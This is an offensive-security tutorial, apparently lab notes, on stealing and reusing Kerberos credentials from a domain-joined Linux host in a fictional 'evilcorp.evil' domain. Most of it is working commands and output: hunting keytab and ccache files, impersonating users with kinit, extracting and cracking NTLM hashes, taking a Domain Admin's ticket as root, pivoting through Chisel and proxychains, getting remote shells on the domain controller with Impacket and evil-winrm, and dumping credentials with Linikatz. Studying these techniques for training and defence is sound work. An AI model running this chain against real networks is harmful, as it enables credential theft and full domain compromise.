# Pass the Ticket (PtT) from Linux

## Table of Contents

- [Step 1: Confirm the box is actually domain-joined](#step-1-confirm-the-box-is-actually-domain-joined)
- [Step 2: Understand the two Kerberos artifacts worth hunting for](#step-2-understand-the-two-kerberos-artifacts-worth-hunting-for)
- [Step 3: Finding Keytab files](#step-3-finding-keytab-files)
- [Step 4: Finding ccache files](#step-4-finding-ccache-files)
- [Step 5: Abusing a Keytab file — impersonating a user](#step-5-abusing-a-keytab-file--impersonating-a-user)
- [Step 6: Going further — extracting the actual password from a keytab](#step-6-going-further--extracting-the-actual-password-from-a-keytab)
- [Step 7: Chaining it — finding more keytabs through newly gained access](#step-7-chaining-it--finding-more-keytabs-through-newly-gained-access)
- [Step 8: Privilege escalation and finding high-value ccache files](#step-8-privilege-escalation-and-finding-high-value-ccache-files)
- [Using Kerberos tickets with attack tools from a non-domain machine](#using-kerberos-tickets-with-attack-tools-from-a-non-domain-machine)
- [Miscellaneous: Converting tickets between Windows and Linux formats](#miscellaneous-converting-tickets-between-windows-and-linux-formats)
- [Linikatz — Mimikatz's Linux counterpart](#linikatz--mimikatzs-linux-counterpart)

---

## Linux can be part of Active Directory too

It's less common than Windows, but Linux machines can absolutely be joined to Active Directory — giving users one identity that works across both Windows and Linux systems in the same organization. When this is set up, Kerberos is typically the authentication mechanism in play, meaning everything we covered for Windows Pass the Ticket has a Linux equivalent too.

> **Note:** a Linux box doesn't even need to be formally domain-joined to use Kerberos tickets — scripts and services can authenticate via Kerberos independently of domain membership.

### Same protocol, different storage

Windows and Linux both follow the identical underlying Kerberos exchange (TGT → TGS → service access). What differs is **where the tickets get stored** on disk, which depends on the specific Linux distro and Kerberos implementation in use.

---

## The scenario for this guide

We have SSH access to `LINUX01`, a domain-joined Linux box, reachable only through a port forward via another machine (`MS01`). We've been handed valid credentials: `david@evilcorp.evil` / `Password2`.

```bash
$ ssh david@evilcorp.evil@10.129.204.23 -p 2222
```

```
Welcome to Ubuntu 20.04.5 LTS
david@evilcorp.evil@linux01:~$
```

---

## Step 1: Confirm the box is actually domain-joined

### With `realm`

```bash
david@evilcorp.evil@linux01:~$ realm list
```

```
evilcorp.evil
  type: kerberos
  domain-name: evilcorp.evil
  client-software: sssd
  permitted-logins: david@evilcorp.evil, julio@evilcorp.evil
  permitted-groups: Linux Admins
```

This confirms Kerberos membership and shows exactly who's allowed to log in — useful recon on its own.

### If `realm` isn't available

Check for domain-integration services directly:

```bash
david@evilcorp.evil@linux01:~$ ps -ef | grep -i "winbind\|sssd"
```

```
/usr/sbin/sssd -i --logger=files
/usr/libexec/sssd/sssd_be --domain evilcorp.evil
```

Seeing `sssd` (or `winbind`) running confirms the same thing, just from a different angle.

---

## Step 2: Understand the two Kerberos artifacts worth hunting for

### Keytab files

- A **`keytab`** is a file holding Kerberos principal + encrypted key pairs — essentially a way to authenticate as a user **without ever typing a password**, perfect for automated scripts.
- One quirk: since the **key is derived from the password**, a `keytab` becomes invalid the moment that password changes, requiring the `keytab` to be regenerated.

Importantly: **`keytabs` aren't tied to the machine they were created on** — they can be copied freely and used elsewhere.

### ccache files (credential caches)

- A **`ccache`** file holds an *already-issued* ticket — essentially a snapshot of an active login session, valid until it expires.
- The path to the active `ccache` lives in the `KRB5CCNAME` environment variable.

Both are gold for an attacker: a `keytab` lets you *generate* fresh tickets on demand, while a `ccache` gives you an *already-valid* ticket ready to use immediately.

---

## Step 3: Finding Keytab files

### Searching by filename

```bash
david@evilcorp.evil@linux01:~$ find / -name *keytab* -ls 2>/dev/null
```

```
-rw-------   1 root  root    1348  /etc/krb5.keytab
-rw-rw-rw-   1 root  root     216  /opt/specialfiles/carlos.keytab
```

> **Note**: To use a `keytab` file, we must have `read` and `write` (rw) privileges on the file.
> **The machine's own keytab matters too:** `/etc/krb5.keytab` is the domain-joined machine's *own* credential, normally readable only by root. Gaining access to it lets you impersonate the computer account itself (e.g., `LINUX01$@EVILCORP.EVIL`).

### Finding keytabs referenced inside scripts

Not every keytab uses the `.keytab` extension — sometimes the only way to spot one is reading through cronjobs or scripts directly:

```bash
carlos@evilcorp.evil@linux01:~$ crontab -l
```
```
*/5 * * * * /home/carlos@evilcorp.evil/.scripts/kerberos_script_test.sh
```

```bash
carlos@evilcorp.evil@linux01:~$ cat kerberos_script_test.sh
```
```bash
#!/bin/bash
kinit svc_workstations@EVILCORP.EVIL -k -t /home/carlos@evilcorp.evil/.scripts/svc_workstations.kt
smbclient //dc01.evilcorp.evil/svc_workstations -c 'ls' -k -no-pass > results.txt
```

The presence of `kinit` (the command that requests and caches a TGT) is the giveaway — this script is authenticating via Kerberos using a keytab (`svc_workstations.kt`), meaning that file is sitting somewhere on disk, ready to be reused.

---

## Step 4: Finding ccache files

### Check the environment variable first

```bash
david@evilcorp.evil@linux01:~$ env | grep -i krb5
```
```
KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

As mentioned previously, `ccache` files are located, by default, at `/tmp`.

### Search the default location directly

```bash
david@evilcorp.evil@linux01:~$ ls -la /tmp
```
```
-rw------- 1 julio@evilcorp.evil  ...  krb5cc_647401106_tBswau
-rw------- 1 david@evilcorp.evil  ...  krb5cc_647401107_Gf415d
-rw------- 1 carlos@evilcorp.evil ...  krb5cc_647402606_qd2Pfh
```

Each user's ccache file is normally only readable by them — but once you have **root**, all of these become fair game, as long as they haven't expired yet.

---

## Step 5: Abusing a Keytab file — impersonating a user

### First, identify who the keytab belongs to

```bash
david@evilcorp.evil@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab
```
```
Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 17:09:13            carlos@EVILCORP.EVIL
```

The ticket corresponds to the user `Carlos`. We can now impersonate the user with `kinit`.

> **Note**: `kinit` is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.

### Import it with `kinit`

```bash
david@evilcorp.evil@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@EVILCORP.EVIL

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/EVILCORP.EVIL@EVILCORP.EVIL
        renew until 10/07/22 17:02:11

david@evilcorp.evil@linux01:~$ kinit carlos@EVILCORP.EVIL -k -t /opt/specialfiles/carlos.keytab
david@evilcorp.evil@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@EVILCORP.EVIL

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/EVILCORP.EVIL@EVILCORP.EVIL
        renew until 10/07/22 17:16:11
```

Your current session now holds a valid ticket as `carlos`.

### Confirm access

```bash
david@evilcorp.evil@linux01:~$ smbclient //dc01/carlos -k -c ls
```
```
carlos.txt   15 bytes
```

> **Tip:** before overwriting your session's ticket this way, save a copy of your original ccache file (pointed to by `KRB5CCNAME`) in case you need to switch back later.

---

## Step 6: Going further — extracting the actual password from a keytab

Impersonating Carlos via his ticket gets you into *network* resources as him — but if you want to actually **log into the Linux box itself** as Carlos, you need his real password.

You can use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) tool to extract valuable information from 502-type `.keytab` files

### Extracting hashes with KeyTabExtract

```bash
david@evilcorp.evil@linux01:~$ python3 keytabextract.py /opt/specialfiles/carlos.keytab
```

```
REALM : EVILCORP.EVIL
SERVICE PRINCIPAL : carlos/
NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

What you can do with each:
- **NTLM hash** → usable directly for Pass the Hash, or crackable with Hashcat/John
- **AES256/AES128 hash** → can be used to forge fresh Kerberos tickets with Rubeus (the "Pass the Key" technique from the Windows guide)

> A keytab can hold multiple principals' credentials merged together — don't assume it's limited to just one user.

### Cracking the NTLM hash

The NTLM hash is the easiest to crack of the three. A quick option for a fast win: online hash lookup services like **crackstation.net**, which maintain databases of billions of already-cracked passwords. Hashcat/John work too for anything not already in such a database.

In this example, the NTLM hash resolved to the plaintext password: `Password5`.

### Logging in as the real user

```bash
david@evilcorp.evil@linux01:~$ su - carlos@evilcorp.evil
Password: Password5
```

A new ticket is automatically issued for Carlos's full login session.

---

## Step 7: Chaining it — finding more keytabs through newly gained access

Once logged in as `carlos`, you'd repeat the same hunt — and as shown earlier, Carlos has a cronjob referencing another keytab (`svc_workstations.kt`). Extract its hash, crack it, and log in as `svc_workstations` — each new account potentially unlocking more of the environment.

---

## Step 8: Privilege escalation and finding high-value ccache files

Suppose `svc_workstations` turns out to have unrestricted `sudo` rights:

```bash
svc_workstations@evilcorp.evil@linux01:~$ sudo -l
```
```
User svc_workstations may run the following commands on linux01:
    (ALL) ALL
```

```bash
svc_workstations@evilcorp.evil@linux01:~$ sudo su
# whoami
root
```

Now, as root, **every** ccache file on the box becomes readable:

```bash
root@linux01:~# ls -la /tmp
```
```
krb5cc_647401106_HRJDux  julio@evilcorp.evil
krb5cc_647401107_O0oUWh  david@evilcorp.evil
krb5cc_647402606_ZX6KFA  carlos@evilcorp.evil
```

Notice `julio` — an account we haven't compromised directly yet. Worth checking his privilege level:

```bash
root@linux01:~# id julio@evilcorp.evil
```
```
groups=...,domain admins@evilcorp.evil,...
```

**Julio is a Domain Admin.** His ccache file is the highest-value target on this entire box. We can attempt to impersonate the user and gain access to the `DC01` Domain Controller host.

### Importing Julio's ccache file

To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.

```bash
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@EVILCORP.EVIL

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/EVILCORP.EVIL@EVILCORP.EVIL
        renew until 10/08/2022 13:25:01
```

Notice that: `Default principal` is now `julio@EVILCORP.EVIL`.


### Confirming Domain Admin-level access

```bash
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
```
```
Program Files
Users
Windows
```

Full access to the Domain Controller's `C$` share — effectively domain-wide compromise, achieved purely by escalating through a chain of keytabs and ccache files, with zero password-guessing against AD itself.

> **A reminder on expiration:** `klist` always shows "valid starting" and "expires" timestamps. ccache files are inherently temporary and can expire or change on logout — check these before relying on a ticket.

---

## Using Kerberos tickets with attack tools from a non-domain machine

If your actual attack box **isn't** domain-joined (the typical real-world case), you still need to be able to reach the Domain Controller and resolve domain names — this usually means proxying your traffic through a machine that *is* on the internal network.

### Setting up the pivot with Chisel + Proxychains

Hardcode the domain hosts into `/etc/hosts`:
```
$ cat /etc/hosts

# Host addresses

172.16.1.10 evilcorp.evil dc01.evilcorp.evil dc01
172.16.1.5  ms01.evilcorp.evil ms01
```

Configure Proxychains to use a SOCKS5 proxy:
```
$ cat /etc/proxychains.conf

...SNIP...

[ProxyList]
socks5 127.0.0.1 1080
```

Start a Chisel server on your attack box:
```bash
$ sudo ./chisel server --reverse
```

Connect from the pivot machine (`MS01`, reached via RDP) back to your Chisel server:
```cmd
C:\evil> chisel.exe client 10.10.14.33:8080 R:socks
```

Finally, transfer Julio's `ccache` file to your attack box and point `KRB5CCNAME` at it:
```bash
$ export KRB5CCNAME=/home/evil-student/krb5cc_647401106_I8I133
```

### Using Impacket through the proxy

```bash
$ proxychains impacket-wmiexec dc01 -k
```
```
C:\>whoami
evilcorp\julio
```

`-k` tells Impacket to use Kerberos authentication (instead of NTLM) and pull credentials from the ccache pointed to by `KRB5CCNAME`.

### Using Evil-WinRM through the proxy

To use `evil-winrm` with `Kerberos`, we need to install the `Kerberos package` used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. 

While installing, we'll get a prompt for the Kerberos realm. Use the domain name: `EVILCORP.EVIL`, and the KDC is the `DC01`.

First, install Kerberos client support:
```bash
$ sudo apt-get install krb5-user -y

Reading package lists... Done                                                                                                  
Building dependency tree... Done    
Reading state information... Done

...SNIP...
```

Default Kerberos v5 realm:
<img width="848" height="177" alt="image" src="https://github.com/user-attachments/assets/97d3b6e3-39a6-46be-aba9-b3d0dfbecbac" />

- The Kerberos servers can be empty.

Administrative server for your Kerberos realm:
<img width="855" height="148" alt="image" src="https://github.com/user-attachments/assets/769b05ad-ab63-4a01-adc4-b565e3da92d0" />

In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:
```bash
$ cat /etc/krb5.conf

[libdefaults]
        default_realm = EVILCORP.EVIL

...SNIP...

[realms]
    EVILCORP.EVIL = {
        kdc = dc01.evilcorp.evil
    }

...SNIP...
```

Now we can use `evil-winrm`:
```bash
$ proxychains evil-winrm -i dc01 -r evilcorp.evil
```
```
*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
evilcorp\julio
DC01
```

---

## Miscellaneous: Converting tickets between Windows and Linux formats

Windows uses `.kirbi` files, Linux uses ccache files — **impacket-ticketConverter** translates between them.

**ccache → kirbi (to use a Linux-captured ticket on Windows):**
```bash
$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
```
[+] done
```

**Importing the converted ticket on a Windows machine with Rubeus:**
```cmd
C:\evil> Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```
```
[+] Ticket successfully imported!
```

```cmd
C:\evil> dir \\dc01\julio
julio.txt
```

Same stolen ticket, now usable on either operating system.

---

## Linikatz — Mimikatz's Linux counterpart

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) (built by Cisco's security team) applies the Mimikatz philosophy to Linux/UNIX systems integrated with Active Directory — it automatically extracts credentials and tickets from whatever Kerberos implementation is in use (FreeIPA, SSSD, Samba, Vintella, and others). Just like Mimikatz, it requires **root** access to run.

```bash
$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
$ /opt/linikatz.sh
```

```
I: [sss-check] SSS AD configuration
-rw------- 1 root root ... /var/lib/sss/db/ccache_EVILCORP.EVIL

I: [kerberos-check] User Kerberos tickets
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@EVILCORP.EVIL
```

It systematically checks every known credential storage location on the box and dumps everything it finds — machine tickets, user tickets, keytabs, cached hashes — into a results folder (named `linikatz.*`), all in formats (ccache/keytab) ready to reuse with the techniques above.

---

## Quick Recap

| Step | Tool/Command | Purpose |
|------|-----------------|------------|
| Check domain join | `realm list`, or `ps -ef | grep sssd` | Confirm Kerberos integration |
| Find keytabs | `find / -name *keytab*`, read cronjobs/scripts | Locate reusable credential files |
| Find ccache files | `env | grep krb5`, `ls -la /tmp` | Locate active tickets |
| Impersonate via keytab | `kinit user -k -t file.keytab` | Load a ticket without a password |
| Extract keytab secrets | KeyTabExtract | Recover NTLM/AES hashes for cracking or ticket forging |
| Use a ccache file | `export KRB5CCNAME=<path>` | Impersonate whoever that ticket belongs to |
| Proxy Kerberos traffic from off-domain | Chisel + Proxychains | Reach the KDC from a non-domain-joined attack box |
| Convert ticket formats | `impacket-ticketConverter` | Move tickets between Windows (.kirbi) and Linux (ccache) |
| Full automated dump | Linikatz (root required) | Extract every credential/ticket across multiple Kerberos implementations at once |

**Key idea:** Linux domain-joined machines mirror Windows almost exactly in how Kerberos works — the only real difference is where tickets live on disk (ccache files and keytabs instead of LSASS memory). Chaining through found keytabs, cracking their hashes, and escalating to root to read other users' ccache files is a very natural path from "low-privilege Linux shell" all the way to "Domain Admin ticket in hand."
